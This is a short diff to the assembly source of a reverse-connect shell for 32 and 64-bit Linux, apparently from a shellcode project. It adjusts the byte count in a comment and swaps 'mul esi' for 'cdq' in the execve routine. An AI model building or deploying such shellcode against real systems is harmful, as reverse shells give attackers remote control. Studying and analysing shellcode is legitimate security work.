@@ -27,7 +27,7 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; 130 byte reverse connect shell
+; 131 byte reverse connect shell
 ;
 ; Tested on 32 and 64-bit versions of Linux
 ;
@@ -122,8 +122,8 @@ x86_dup2:
     int     0x80
     
 x84_execve:
+    cdq
     xor     esi, esi
-    mul     esi
     push    eax         ; '\0'
     push    eax         ; null space
     push    eax         ; null space
